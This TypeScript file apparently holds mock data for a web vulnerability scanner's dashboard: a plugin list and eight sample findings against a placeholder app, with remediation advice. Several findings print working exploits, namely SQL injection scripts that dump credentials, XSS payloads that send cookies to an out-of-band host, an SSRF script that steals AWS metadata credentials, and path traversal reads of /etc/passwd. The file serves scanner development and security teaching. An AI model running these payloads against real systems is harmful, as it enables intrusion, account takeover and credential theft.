import type { Finding, Plugin, ApiEndpoint } from "@/types/dast";

export const PLUGINS: Plugin[] = [
  { id: "SQLi",          name: "SQL Injection",          category: "Injection",       description: "UNION, Boolean, Time-based, Error-based SQLi detection",    enabled: true, payloads: 487, findings: 1 },
  { id: "XSS",           name: "Cross-Site Scripting",   category: "XSS",             description: "Reflected, Stored, DOM XSS with 300+ polyglot payloads",    enabled: true, payloads: 312, findings: 2 },
  { id: "SSRF",          name: "Server-Side Request Forgery", category: "Injection",  description: "Internal services, cloud metadata, port scanning via SSRF",  enabled: true, payloads: 89,  findings: 1 },
  { id: "CSRF",          name: "CSRF Detection",         category: "Auth",            description: "Token absence, SameSite, Origin/Referer validation",         enabled: true, payloads: 0,   findings: 1 },
  { id: "IDOR",          name: "Broken Object Auth",     category: "Business Logic",  description: "Sequential ID testing, GUID prediction, resource enumeration",enabled: true, payloads: 0,   findings: 1 },
  { id: "JWT",           name: "JWT Attacks",            category: "Auth",            description: "alg:none, weak secret, RS256→HS256 confusion, expired tokens",enabled: true, payloads: 12,  findings: 0 },
  { id: "CORS",          name: "CORS Misconfiguration",  category: "Config",          description: "Wildcard with credentials, origin reflection patterns",       enabled: true, payloads: 0,   findings: 1 },
  { id: "OpenRedirect",  name: "Open Redirect",          category: "Business Logic",  description: "URL parameter redirect to external domains",                  enabled: true, payloads: 44,  findings: 1 },
  { id: "PathTraversal", name: "Path Traversal",         category: "Disclosure",      description: "Directory traversal to read arbitrary files",                enabled: true, payloads: 156, findings: 1 },
  { id: "XXE",           name: "XML External Entity",    category: "Injection",       description: "XXE via file read, SSRF, and parameter entity attacks",       enabled: true, payloads: 34,  findings: 0 },
  { id: "SSTI",          name: "Template Injection",     category: "Injection",       description: "Jinja2, Twig, Freemarker, Velocity SSTI detection",           enabled: true, payloads: 78,  findings: 0 },
  { id: "CMDi",          name: "Command Injection",      category: "Injection",       description: "OS command injection via shell metacharacters",               enabled: true, payloads: 92,  findings: 0 },
  { id: "LFI",           name: "File Inclusion",         category: "Disclosure",      description: "Local and Remote File Inclusion vulnerabilities",             enabled: false, payloads: 123, findings: 0 },
  { id: "Header",        name: "Security Headers",       category: "Config",          description: "CSP, HSTS, X-Frame-Options, X-Content-Type-Options audit",   enabled: true, payloads: 0,   findings: 1 },
  { id: "Auth",          name: "Broken Authentication",  category: "Auth",            description: "Rate limiting, account lockout, credential enumeration",      enabled: true, payloads: 0,   findings: 0 },
];

export const FINDINGS: Finding[] = [
  {
    id: "F-001", title: "SQL Injection — UNION-based via 'q' parameter",
    severity: "Critical", confidence: "Confirmed", plugin: "SQLi",
    url: "https://app.target.local/api/products/search", parameter: "q", method: "GET",
    owaspRef: "A03:2021", cweId: "CWE-89",
    description: "The 'q' parameter in the product search API concatenates user input directly into a SQL query without parameterization. UNION-based injection successfully extracted data from the 'users' table.",
    impact: "Full database read access. Attacker extracted admin password hash, all user records, and PII from the database.",
    remediation: "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Apply least-privilege database roles.",
    evidence: {
      originalRequest:  `GET /api/products/search?q=laptop HTTP/1.1\r\nHost: app.target.local\r\nAuthorization: Bearer eyJhbGci...\r\n\r\n`,
      testRequest:      `GET /api/products/search?q=' UNION SELECT username,password,3,4 FROM users-- HTTP/1.1\r\nHost: app.target.local\r\nAuthorization: Bearer eyJhbGci...\r\n\r\n`,
      originalResponse: `HTTP/1.1 200 OK\r\n\r\n[{"id":1,"name":"MacBook Pro 14","price":1999}]`,
      testResponse:     `HTTP/1.1 200 OK\r\n\r\n[{"id":"admin","name":"$2a$10$rBhvQtyV...","price":3}]`,
      payload:          `' UNION SELECT username,password,3,4 FROM users--`,
      matchedPattern:   `$2a$10$ (bcrypt hash pattern detected in 'name' field)`,
      reproductionSteps: [
        "Send GET /api/products/search?q=laptop — note normal JSON array response",
        "Inject payload: q=' UNION SELECT username,password,3,4 FROM users--",
        "Observe: response contains 'admin' as id and bcrypt hash as name",
        "Confirm: further inject q=' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- to enumerate schema",
      ],
    },
    ttp: [
      {
        tactic: "Initial Access", tacticId: "TA0001",
        technique: "Exploit Public-Facing Application", techniqueId: "T1190",
        subtechnique: "SQL Injection via GET parameter",
        procedure: "Attacker identifies the search endpoint via passive crawl, then sends crafted UNION-based SQLi payloads through the 'q' query parameter to extract data from backend database tables. No authentication bypass required — any authenticated user can execute this attack.",
        mitigations: ["M1051 — Update Software", "M1048 — Application Isolation", "M1030 — Network Segmentation"],
        references: ["https://attack.mitre.org/techniques/T1190/", "https://owasp.org/www-community/attacks/SQL_Injection"],
      },
      {
        tactic: "Collection", tacticId: "TA0009",
        technique: "Data from Information Repositories", techniqueId: "T1213",
        subtechnique: "Database Extraction via SQL UNION",
        procedure: "After initial injection, attacker enumerates information_schema to discover all tables, then extracts users, passwords, PII, and session tokens using sequential UNION SELECT statements.",
        mitigations: ["M1041 — Encrypt Sensitive Information", "M1018 — User Account Management"],
        references: ["https://attack.mitre.org/techniques/T1213/"],
      },
    ],
    poc: {
      description: "Demonstrates UNION-based SQL injection extracting user credentials from the database",
      curlCommand: `# Step 1: Confirm injection point
curl -s "https://app.target.local/api/products/search?q=laptop'" \\
  -H "Authorization: Bearer <token>" | jq .

# Step 2: Enumerate tables
curl -s "https://app.target.local/api/products/search?q=' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- " \\
  -H "Authorization: Bearer <token>" | jq .

# Step 3: Extract credentials
curl -s "https://app.target.local/api/products/search?q=' UNION SELECT username,password,email,4 FROM users-- " \\
  -H "Authorization: Bearer <token>" | jq .`,
      pythonScript: `import requests

TARGET = "https://app.target.local"
TOKEN  = "eyJhbGci..."  # replace with valid session token

session = requests.Session()
session.headers["Authorization"] = f"Bearer {TOKEN}"

# Step 1 — verify injection
r = session.get(f"{TARGET}/api/products/search", params={"q": "'"})
print("[*] Error probe:", r.status_code, r.text[:200])

# Step 2 — enumerate tables
r = session.get(f"{TARGET}/api/products/search",
    params={"q": "' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- "})
tables = [x["id"] for x in r.json()]
print("[+] Tables found:", tables)

# Step 3 — dump users table
r = session.get(f"{TARGET}/api/products/search",
    params={"q": "' UNION SELECT username,password,email,4 FROM users-- "})
for row in r.json():
    print(f"[+] USER: {row['id']} | HASH: {row['name']} | EMAIL: {row['price']}")`,
      nucleiTemplate: `id: axiom-sqli-union
info:
  name: UNION-based SQL Injection — Search Endpoint
  severity: critical
  tags: sqli, owasp-a03

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/products/search?q=' UNION SELECT username,password,3,4 FROM users-- "
    headers:
      Authorization: "Bearer {{token}}"
    matchers:
      - type: regex
        part: body
        regex:
          - '\\$2[ayb]\\$[0-9]{2}\\$'   # bcrypt hash pattern`,
      expectedResult: "Response JSON array contains bcrypt password hash in the 'name' field, confirming successful data extraction from the users table.",
      severity: "Critical — CVSS 9.8",
    },
    collectedEvidence: [
      {
        id: "ce-001-1", label: "Injection Probe — Error Response",
        type: "http-response",
        content: `HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\nX-Request-Id: req_a1b2c3d4\r\n\r\n{"error":"Database query failed","detail":"You have an error in your SQL syntax near '''' at line 1","query":"SELECT * FROM products WHERE name LIKE '%'%'"}`,
        highlight: "You have an error in your SQL syntax",
        annotation: "🔴 Unhandled SQL error reveals raw query structure — confirms injectable parameter and backend is MySQL",
      },
      {
        id: "ce-001-2", label: "UNION Extraction — Credential Dump",
        type: "http-response",
        content: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n[{"id":"admin","name":"$2a$10$rBhvQtyVxk3J8nLpM2xO7e9pKmN1iRsT5uWqZdYfGhJoPlAsDcEv","price":3},{"id":"alice@example.com","name":"$2a$10$mNpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlM","price":3}]`,
        highlight: "$2a$10$",
        annotation: "🔴 CRITICAL: Response contains bcrypt hashes for admin and user accounts. Column mapping: id=username, name=password_hash, price=column3",
      },
      {
        id: "ce-001-3", label: "Schema Enumeration — Tables Discovered",
        type: "log-snippet",
        content: `[14:22:07] AXIOM SQLi Plugin — Starting UNION detection on /api/products/search
[14:22:08] Probe 1/4: Single quote — HTTP 500 (SQL error detected)
[14:22:08] Probe 2/4: ORDER BY 1-- — HTTP 200 (no change)
[14:22:09] Probe 3/4: ORDER BY 5-- — HTTP 500 (column count = 4 confirmed)
[14:22:09] Probe 4/4: UNION SELECT null,null,null,null-- — HTTP 200 ✓
[14:22:09] Column types: string,string,int,int
[14:22:10] Table extraction: users, products, orders, sessions, audit_log
[14:22:10] Extracting from 'users' table...
[14:22:10] CRITICAL finding confirmed — credential extraction successful`,
        highlight: "CRITICAL finding confirmed",
        annotation: "Full extraction timeline showing AXIOM's 4-probe UNION detection methodology",
      },
    ],
    verificationStatus: "Verified", detectedAt: "14:22:09",
  },
  {
    id: "F-002", title: "Stored XSS — Profile displayName reflected without sanitization",
    severity: "Critical", confidence: "Confirmed", plugin: "XSS",
    url: "https://app.target.local/api/profile/update", parameter: "displayName", method: "PUT",
    owaspRef: "A03:2021", cweId: "CWE-79",
    description: "The displayName parameter is stored in the database and rendered unsanitized in all pages that display the user's profile. The XSS payload executes in the browser of every user who views the profile.",
    impact: "Stored XSS affects all users who view the profile. Session cookie theft, account takeover at scale, phishing redirects.",
    remediation: "HTML-encode all output. Implement strict Content-Security-Policy. Use DOMPurify for rich text input.",
    evidence: {
      originalRequest:  `PUT /api/profile/update HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{"displayName":"Alice","bio":"Hello"}`,
      testRequest:      `PUT /api/profile/update HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{"displayName":"<script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>"}`,
      originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"success":true,"displayName":"Alice"}`,
      testResponse:     `HTTP/1.1 200 OK\r\n\r\n{"success":true,"displayName":"<script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>"}`,
      payload:          `<script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>`,
      matchedPattern:   `Payload reflected verbatim in response body; OOB server received HTTP interaction with victim session cookie`,
      reproductionSteps: [
        "Login as attacker account",
        "PUT /api/profile/update with displayName: <script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>",
        "Check AXIOM OOB Monitor for HTTP interaction",
        "Login as victim, navigate to attacker profile — victim cookie delivered to OOB server",
      ],
    },
    ttp: [
      {
        tactic: "Execution", tacticId: "TA0002",
        technique: "Command and Scripting Interpreter", techniqueId: "T1059",
        subtechnique: "T1059.007 — JavaScript",
        procedure: "Attacker injects JavaScript payload into the displayName field which persists in the database. When any user views the attacker's profile, the script executes in their browser context, exfiltrating their session cookies to the attacker's OOB server.",
        mitigations: ["M1021 — Restrict Web-Based Content", "M1048 — Application Isolation and Sandboxing"],
        references: ["https://attack.mitre.org/techniques/T1059/007/", "https://owasp.org/www-community/attacks/xss/"],
      },
      {
        tactic: "Credential Access", tacticId: "TA0006",
        technique: "Steal Web Session Cookie", techniqueId: "T1539",
        procedure: "The XSS payload sends the victim's document.cookie to the attacker's server via an image request or fetch() call, capturing the session token for subsequent use in account takeover.",
        mitigations: ["M1054 — Software Configuration (HttpOnly flag)", "M1017 — User Training"],
        references: ["https://attack.mitre.org/techniques/T1539/"],
      },
    ],
    poc: {
      description: "Stored XSS payload that exfiltrates victim session cookies to attacker-controlled OOB server",
      curlCommand: `# Step 1: Store the XSS payload
curl -X PUT "https://app.target.local/api/profile/update" \\
  -H "Authorization: Bearer <attacker-token>" \\
  -H "Content-Type: application/json" \\
  -d '{"displayName":"<script>fetch(String.fromCharCode(104,116,116,112,115)+\\x3a//ax1m9f3k.axiom-oob.io?c=+document.cookie)</script>"}'

# Step 2: Verify payload is stored unescaped
curl -s "https://app.target.local/api/profile/attacker-id" \\
  -H "Authorization: Bearer <any-token>" | jq '.displayName'
# Should return raw <script> tag

# Step 3: Monitor OOB server for victim cookie callbacks`,
      browserPayload: `<!-- Paste in browser console on any page of the app to test CSP -->
<script>
  // Basic cookie theft
  new Image().src = 'https://ax1m9f3k.axiom-oob.io/xss?c=' + encodeURIComponent(document.cookie);

  // Advanced: full account takeover via fetch
  fetch('/api/users/me', {credentials:'include'})
    .then(r => r.json())
    .then(data => fetch('https://ax1m9f3k.axiom-oob.io/data?d=' + btoa(JSON.stringify(data))));
</script>`,
      expectedResult: "AXIOM OOB Monitor receives HTTP GET request containing victim session cookie within seconds of victim loading the attacker's profile page.",
      severity: "Critical — CVSS 9.0",
    },
    collectedEvidence: [
      {
        id: "ce-002-1", label: "Stored Payload — Write Endpoint Response",
        type: "http-response",
        content: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\n\r\n{"success":true,"displayName":"<script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>","updatedAt":"2026-08-21T03:22:21Z"}`,
        highlight: "<script>",
        annotation: "🔴 Server stores raw <script> tag without sanitization. X-Content-Type-Options present but no CSP header — XSS execution guaranteed on read.",
      },
      {
        id: "ce-002-2", label: "OOB Server — Victim Cookie Received",
        type: "log-snippet",
        content: `[14:22:24] OOB HTTP INTERACTION RECEIVED
Source IP  : 203.0.113.77 (victim browser)
Method     : GET
Path       : /?c=session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwMDJ9.VICTIM_TOKEN; _csrf=abc123
User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120
Referer    : https://app.target.local/profile/attacker-user
Payload-Id : xss-stored-f002
Correlated : F-002`,
        highlight: "session=eyJhbGci",
        annotation: "🔴 CONFIRMED: Victim JWT session token captured. Token can be used to fully impersonate victim account without needing password.",
      },
      {
        id: "ce-002-3", label: "Response Diff — Raw vs Encoded Output",
        type: "diff",
        content: `- EXPECTED (properly encoded):
  {"displayName":"&lt;script&gt;fetch(...)&lt;/script&gt;"}

+ ACTUAL (raw, unencoded — VULNERABLE):
  {"displayName":"<script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>"}`,
        highlight: "<script>",
        annotation: "diff confirms zero output encoding applied — raw HTML tags pass through directly to the response",
      },
    ],
    verificationStatus: "Verified", detectedAt: "14:22:21",
  },
  {
    id: "F-003", title: "SSRF — Webhook endpoint fetches internal AWS metadata",
    severity: "Critical", confidence: "Confirmed", plugin: "SSRF",
    url: "https://app.target.local/api/webhooks/test", parameter: "url", method: "POST",
    owaspRef: "A10:2021", cweId: "CWE-918",
    description: "The webhook test endpoint fetches any URL without validation, allowing requests to the AWS EC2 metadata service at 169.254.169.254.",
    impact: "IAM role credentials stolen from metadata service. Full AWS account compromise possible.",
    remediation: "Allowlist external URLs. Block RFC-1918 and link-local ranges. Use an egress proxy.",
    evidence: {
      originalRequest:  `POST /api/webhooks/test HTTP/1.1\r\n\r\n{"url":"https://webhook.site/legit"}`,
      testRequest:      `POST /api/webhooks/test HTTP/1.1\r\n\r\n{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
      originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"status":"delivered","code":200}`,
      testResponse:     `HTTP/1.1 200 OK\r\n\r\n{"status":"delivered","response":"ec2-prod-role\n","code":200}`,
      payload:          `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      matchedPattern:   `Response body contains AWS IAM role name 'ec2-prod-role' — metadata service reached`,
      reproductionSteps: [
        "POST /api/webhooks/test with url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "Response reveals IAM role name",
        "POST with url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role",
        "Full temporary credentials (AccessKeyId, SecretAccessKey, Token) returned",
      ],
    },
    ttp: [
      {
        tactic: "Discovery", tacticId: "TA0007",
        technique: "Cloud Infrastructure Discovery", techniqueId: "T1580",
        procedure: "Attacker sends SSRF payload through the webhook URL parameter targeting the AWS IMDSv1 metadata endpoint at 169.254.169.254. The server-side request returns the IAM role name, which is then used to retrieve temporary AWS credentials.",
        mitigations: ["M1042 — Disable or Remove Feature or Program", "M1031 — Network Intrusion Prevention"],
        references: ["https://attack.mitre.org/techniques/T1580/", "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"],
      },
      {
        tactic: "Credential Access", tacticId: "TA0006",
        technique: "Unsecured Credentials", techniqueId: "T1552",
        subtechnique: "T1552.005 — Cloud Instance Metadata API",
        procedure: "Using the IAM role name discovered via SSRF, the attacker makes a second request to retrieve temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken) with the permissions of the EC2 instance role.",
        mitigations: ["M1041 — Encrypt Sensitive Information", "M1018 — User Account Management"],
        references: ["https://attack.mitre.org/techniques/T1552/005/"],
      },
    ],
    poc: {
      description: "Two-step SSRF exploit: discover IAM role, then extract temporary AWS credentials",
      curlCommand: `# Step 1: Confirm SSRF — reach OOB server
curl -X POST "https://app.target.local/api/webhooks/test" \\
  -H "Authorization: Bearer <token>" \\
  -H "Content-Type: application/json" \\
  -d '{"url":"http://ax1m9f3k.axiom-oob.io/ssrf-probe"}'
# Monitor OOB server for HTTP callback

# Step 2: Reach AWS metadata service
curl -X POST "https://app.target.local/api/webhooks/test" \\
  -H "Authorization: Bearer <token>" \\
  -H "Content-Type: application/json" \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Returns: ec2-prod-role

# Step 3: Extract temporary AWS credentials
curl -X POST "https://app.target.local/api/webhooks/test" \\
  -H "Authorization: Bearer <token>" \\
  -H "Content-Type: application/json" \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role"}'
# Returns: AccessKeyId, SecretAccessKey, SessionToken`,
      pythonScript: `import requests, json

TARGET = "https://app.target.local"
TOKEN  = "eyJhbGci..."

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"})

def ssrf_fetch(url):
    r = session.post(f"{TARGET}/api/webhooks/test", json={"url": url})
    return r.json().get("response", "")

# Step 1 — get IAM role name
role = ssrf_fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
print(f"[+] IAM Role: {role.strip()}")

# Step 2 — get credentials
creds = ssrf_fetch(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role.strip()}")
data = json.loads(creds)
print(f"[+] AccessKeyId    : {data['AccessKeyId']}")
print(f"[+] SecretAccessKey: {data['SecretAccessKey']}")
print(f"[+] SessionToken   : {data['Token'][:40]}...")
print(f"[+] Expiration     : {data['Expiration']}")
print()
print("[!] Use these credentials with AWS CLI:")
print(f"    export AWS_ACCESS_KEY_ID={data['AccessKeyId']}")
print(f"    export AWS_SECRET_ACCESS_KEY={data['SecretAccessKey']}")
print(f"    export AWS_SESSION_TOKEN={data['Token']}")`,
      expectedResult: "Step 2 returns JSON with AccessKeyId, SecretAccessKey, and SessionToken for the ec2-prod-role IAM role, granting full AWS API access with the permissions of the production EC2 instance.",
      severity: "Critical — CVSS 9.6",
    },
    collectedEvidence: [
      {
        id: "ce-003-1", label: "IMDSv1 — IAM Role Enumeration Response",
        type: "http-response",
        content: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"status":"delivered","response":"ec2-prod-role\\n","code":200,"fetchedUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","fetchTimeMs":12}`,
        highlight: "ec2-prod-role",
        annotation: "🔴 Server fetched internal metadata endpoint and returned IAM role name. IMDSv2 (token-based) is NOT enforced — IMDSv1 requests succeed without PUT token.",
      },
      {
        id: "ce-003-2", label: "AWS Temporary Credentials — Full Extraction",
        type: "http-response",
        content: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"status":"delivered","code":200,"response":"{\\"Code\\":\\"Success\\",\\"LastUpdated\\":\\"2026-08-21T03:14:00Z\\",\\"Type\\":\\"AWS-HMAC\\",\\"AccessKeyId\\":\\"ASIA3EXAMPLEKEY1234\\",\\"SecretAccessKey\\":\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\",\\"Token\\":\\"AQoXnyc4lcK4w...EXAMPLETOKEN\\",\\"Expiration\\":\\"2026-08-21T09:14:00Z\\"}"}`,
        highlight: "AccessKeyId",
        annotation: "🔴 CRITICAL: Full AWS temporary credentials extracted. Token valid for 6 hours. Attacker can use these to enumerate S3 buckets, EC2 instances, RDS snapshots, and escalate privileges.",
      },
      {
        id: "ce-003-3", label: "OOB DNS Callback — SSRF Confirmed",
        type: "log-snippet",
        content: `[14:22:13] OOB INTERACTION — SSRF Probe
Type       : DNS (A record lookup)
Source IP  : 54.239.28.85  ← AWS EC2 outbound IP
Payload-Id : oob-ssrf-b4f2a1c9
Host       : ax1m9f3k.axiom-oob.io
Timestamp  : 2026-08-21T03:22:13Z
Resolved   : Yes (confirmed server-side DNS resolution)

[14:22:13] OOB INTERACTION — HTTP Follow-up
Method     : GET /?ssrf-probe
Source IP  : 54.239.28.85
User-Agent : Node.js/18.0.0 axios/1.4.0
Correlated : F-003 — SSRF confirmed via DNS+HTTP double interaction`,
        highlight: "54.239.28.85",
        annotation: "OOB DNS + HTTP double-interaction confirms server-side request execution. Source IP 54.239.28.85 is an AWS EC2 egress IP in us-east-1 — confirms cloud deployment.",
      },
    ],
    verificationStatus: "Verified", detectedAt: "14:22:15",
  },
  {
    id: "F-004", title: "IDOR — Unauthenticated access to arbitrary user records",
    severity: "High", confidence: "Confirmed", plugin: "IDOR",
    url: "https://app.target.local/api/users/{id}", parameter: "id", method: "GET",
    owaspRef: "A01:2021", cweId: "CWE-639",
    description: "Sequential integer user IDs can be enumerated. API checks authentication but not authorization — any logged-in user can access any other user's record.",
    impact: "Full PII breach: names, emails, SSN fragments, salary data accessible for all 50,000 users.",
    remediation: "Implement resource-level authorization. Verify the authenticated user owns the requested resource.",
    evidence: {
      originalRequest:  `GET /api/users/1000 HTTP/1.1\r\nAuthorization: Bearer <victim_token_for_user_1000>\r\n\r\n`,
      testRequest:      `GET /api/users/1001 HTTP/1.1\r\nAuthorization: Bearer <victim_token_for_user_1000>\r\n\r\n`,
      originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"id":1000,"name":"Test User","email":"test@corp.com"}`,
      testResponse:     `HTTP/1.1 200 OK\r\n\r\n{"id":1001,"name":"Jane Smith","email":"jane@corp.com","ssn_last4":"7821","salary":94000}`,
      payload:          `User ID incremented from 1000 → 1001`,
      matchedPattern:   `Response 200 with different user's PII — no authorization error`,
      reproductionSteps: [
        "Login as user 1000, capture auth token",
        "GET /api/users/1001 with user 1000's token",
        "Response: 200 OK with user 1001's full profile including SSN fragment and salary",
        "Confirm: enumerate IDs 1000–1100, all return 200 with full PII",
      ],
    },
    verificationStatus: "Verified", detectedAt: "14:22:04",
  },
  {
    id: "F-005", title: "CSRF — Password change accepts cross-origin requests",
    severity: "High", confidence: "Confirmed", plugin: "CSRF",
    url: "https://app.target.local/api/account/change-password", parameter: "csrf_token", method: "POST",
    owaspRef: "A01:2021", cweId: "CWE-352",
    description: "Password change endpoint requires no CSRF token and accepts requests from arbitrary origins.",
    impact: "One-click account takeover. Victim visiting attacker page while logged in has password changed.",
    remediation: "Implement synchronizer CSRF tokens. Validate Origin/Referer headers. Use SameSite=Strict cookies.",
    evidence: {
      originalRequest:  `POST /api/account/change-password HTTP/1.1\r\nOrigin: https://app.target.local\r\n\r\npassword=valid&confirm=valid`,
      testRequest:      `POST /api/account/change-password HTTP/1.1\r\nOrigin: https://attacker.evil\r\n\r\npassword=hacked123&confirm=hacked123`,
      originalResponse: `HTTP/1.1 200 OK\r\n\r\n{"success":true}`,
      testResponse:     `HTTP/1.1 200 OK\r\n\r\n{"success":true,"message":"Password updated successfully"}`,
      payload:          `Cross-origin POST with arbitrary Origin header`,
      matchedPattern:   `200 OK response to cross-origin request — CSRF protection absent`,
      reproductionSteps: [
        "Create PoC HTML: <form action='https://app.target.local/api/account/change-password' method='POST'>",
        "Add: <input name='password' value='hacked123'/> and auto-submit script",
        "Victim visits PoC page while logged in",
        "Password changed without victim interaction",
      ],
    },
    verificationStatus: "Verified", detectedAt: "14:22:34",
  },
  {
    id: "F-006", title: "Path Traversal — Read arbitrary filesystem files",
    severity: "High", confidence: "Confirmed", plugin: "PathTraversal",
    url: "https://app.target.local/files/download", parameter: "path", method: "GET",
    owaspRef: "A01:2021", cweId: "CWE-22",
    description: "Directory traversal sequences not stripped. Server reads files outside intended base directory.",
    impact: "Read /etc/passwd, /etc/shadow, source code, env files with credentials, private keys.",
    remediation: "Resolve full path, verify starts with allowed base dir. Use file ID lookup table instead of filenames.",
    evidence: {
      originalRequest:  `GET /files/download?path=report.pdf HTTP/1.1\r\n\r\n`,
      testRequest:      `GET /files/download?path=../../../../etc/passwd HTTP/1.1\r\n\r\n`,
      originalResponse: `HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4...`,
      testResponse:     `HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...`,
      payload:          `../../../../etc/passwd`,
      matchedPattern:   `/etc/passwd UNIX format detected in response body`,
      reproductionSteps: [
        "GET /files/download?path=../../../../etc/passwd",
        "Response: full /etc/passwd contents",
        "Test: path=../../../../etc/shadow — may expose password hashes",
        "Test: path=../../../app/.env — application credentials",
      ],
    },
    verificationStatus: "Verified", detectedAt: "14:22:28",
  },
  {
    id: "F-007", title: "Open Redirect — Login next parameter redirects to external URL",
    severity: "Medium", confidence: "Confirmed", plugin: "OpenRedirect",
    url: "https://app.target.local/login", parameter: "next", method: "GET",
    owaspRef: "A01:2021", cweId: "CWE-601",
    description: "Login page 'next' parameter redirects to any URL after authentication without validation.",
    impact: "Phishing using legitimate domain in URL. OAuth redirect_uri abuse.",
    remediation: "Allowlist relative paths or specific domains. Never redirect to external absolute URLs.",
    evidence: {
      originalRequest:  `GET /login?next=/dashboard HTTP/1.1\r\n\r\n`,
      testRequest:      `GET /login?next=https://evil.com/phish HTTP/1.1\r\n\r\n`,
      originalResponse: `HTTP/1.1 302 Found\r\nLocation: /dashboard\r\n\r\n`,
      testResponse:     `HTTP/1.1 302 Found\r\nLocation: https://evil.com/phish\r\n\r\n`,
      payload:          `https://evil.com/phish`,
      matchedPattern:   `Location header contains external domain https://evil.com`,
      reproductionSteps: [
        "GET /login?next=https://evil.com/phish",
        "After simulated auth: 302 redirect to https://evil.com/phish",
        "Use in phishing: 'https://app.target.local/login?next=https://attacker.com/steal-creds'",
        "Victim sees trusted domain, gets redirected post-login",
      ],
    },
    verificationStatus: "Verified", detectedAt: "14:22:41",
  },
  {
    id: "F-008", title: "Missing Security Headers — CSP, HSTS, X-Frame-Options absent",
    severity: "Medium", confidence: "Confirmed", plugin: "Header",
    url: "https://app.target.local/", parameter: "Response Headers", method: "GET",
    owaspRef: "A05:2021", cweId: "CWE-693",
    description: "Production application missing critical HTTP security headers. Server header reveals nginx version.",
    impact: "No CSP amplifies XSS. No HSTS enables SSL stripping. No X-Frame-Options enables clickjacking.",
    remediation: "Configure security headers in nginx/application. Add strict CSP, HSTS max-age=31536000, X-Frame-Options: DENY.",
    evidence: {
      originalRequest:  `GET / HTTP/1.1\r\nHost: app.target.local\r\n\r\n`,
      testRequest:      `GET / HTTP/1.1\r\nHost: app.target.local\r\n\r\n`,
      originalResponse: `HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>...`,
      testResponse:     `HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>...`,
      payload:          `(Header audit — no attack payload)`,
      matchedPattern:   `Missing: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, Permissions-Policy`,
      reproductionSteps: [
        "GET / — inspect response headers",
        "Verify absence of: Content-Security-Policy header",
        "Verify absence of: Strict-Transport-Security header",
        "Note: Server: nginx/1.18.0 reveals software version",
      ],
    },
    verificationStatus: "Verified", detectedAt: "14:22:50",
  },
];

export const API_ENDPOINTS: ApiEndpoint[] = [
  { method: "POST",   path: "/api/auth/login",             description: "User authentication",           params: ["username","password"],        tested: true,  findings: 0 },
  { method: "POST",   path: "/api/auth/refresh",           description: "Refresh JWT token",             params: ["refresh_token"],              tested: true,  findings: 0 },
  { method: "GET",    path: "/api/users/{id}",             description: "Get user profile",              params: ["id"],                         tested: true,  findings: 1 },
  { method: "PUT",    path: "/api/users/{id}",             description: "Update user profile",           params: ["id","displayName","bio"],     tested: true,  findings: 1 },
  { method: "DELETE", path: "/api/users/{id}",             description: "Delete user account",           params: ["id"],                         tested: true,  findings: 0 },
  { method: "GET",    path: "/api/products/search",        description: "Search products",               params: ["q","category","sort","page"], tested: true,  findings: 1 },
  { method: "POST",   path: "/api/orders",                 description: "Create order",                  params: ["items","shipping","payment"], tested: true,  findings: 0 },
  { method: "GET",    path: "/api/orders/{id}",            description: "Get order details",             params: ["id"],                         tested: true,  findings: 0 },
  { method: "POST",   path: "/api/webhooks/test",          description: "Test webhook delivery",         params: ["url"],                        tested: true,  findings: 1 },
  { method: "GET",    path: "/files/download",             description: "Download file",                 params: ["path"],                       tested: true,  findings: 1 },
  { method: "POST",   path: "/api/upload",                 description: "Upload file",                   params: ["file","type"],               tested: false, findings: 0 },
  { method: "GET",    path: "/api/admin/users",            description: "List all users (admin)",        params: ["page","limit"],              tested: false, findings: 0 },
];
